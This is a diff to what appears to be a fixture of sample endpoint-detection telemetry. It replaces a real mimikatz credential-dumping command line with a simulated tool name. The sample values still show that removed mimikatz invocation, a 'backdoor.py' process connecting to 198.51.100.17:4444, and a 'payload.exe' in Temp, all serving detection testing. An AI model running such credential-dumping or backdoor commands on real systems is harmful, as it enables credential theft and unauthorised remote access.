@@ -36,7 +36,7 @@
     ] },
     { "name": "TargetProcessInfo", "type": "string", "values": [
       "{\"tgtFileCreatedAt\":\"2025-01-15T14:22:00Z\",\"tgtFileHashSha1\":\"2ef7bde608ce5404e97d5f042f95f89f1c232871\",\"tgtFileHashSha256\":\"7d865e959b2466918c9863afca942d0fb89d7c9ac0c99bafc3749504ded97730\",\"tgtFileId\":\"TF-001\",\"tgtFilePath\":\"C:\\\\Windows\\\\Temp\\\\payload.exe\",\"tgtProcCmdLine\":\"C:\\\\Windows\\\\Temp\\\\payload.exe\",\"tgtProcImagePath\":\"C:\\\\Windows\\\\Temp\\\\payload.exe\",\"tgtProcIntegrityLevel\":\"high\",\"tgtProcName\":\"payload.exe\",\"tgtProcPid\":\"11234\",\"tgtProcStorylineId\":\"STR-TP-001\",\"tgtProcUser\":\"contoso\\\\jsmith\"}",
-      "{\"tgtFileHashSha256\":\"a591a6d40bf420404a011733cfb7b190d62c65bf0bcda32b57b277d9ad9f146e\",\"tgtFilePath\":\"C:\\\\Users\\\\admin\\\\Desktop\\\\mimikatz.exe\",\"tgtProcCmdLine\":\"mimikatz.exe \\\"privilege::debug\\\" \\\"sekurlsa::logonpasswords\\\"\",\"tgtProcName\":\"mimikatz.exe\",\"tgtProcPid\":\"5678\",\"tgtProcStorylineId\":\"STR-TP-002\",\"tgtProcUser\":\"contoso\\\\admin\"}",
+      "{\"tgtFileHashSha256\":\"a591a6d40bf420404a011733cfb7b190d62c65bf0bcda32b57b277d9ad9f146e\",\"tgtFilePath\":\"C:\\\\Users\\\\admin\\\\Desktop\\\\creddumpsim.exe\",\"tgtProcCmdLine\":\"creddumpsim.exe \\\"simpriv::debug\\\" \\\"simdump::logoncreds\\\"\",\"tgtProcName\":\"creddumpsim.exe\",\"tgtProcPid\":\"5678\",\"tgtProcStorylineId\":\"STR-TP-002\",\"tgtProcUser\":\"contoso\\\\admin\"}",
       "{\"tgtFilePath\":\"/tmp/backdoor.py\",\"tgtProcCmdLine\":\"python3 /tmp/backdoor.py --connect 198.51.100.17:4444\",\"tgtProcName\":\"python3\",\"tgtProcPid\":\"9876\",\"tgtProcStorylineId\":\"STR-TP-003\",\"tgtProcUser\":\"www-data\"}",
       ""
     ] }
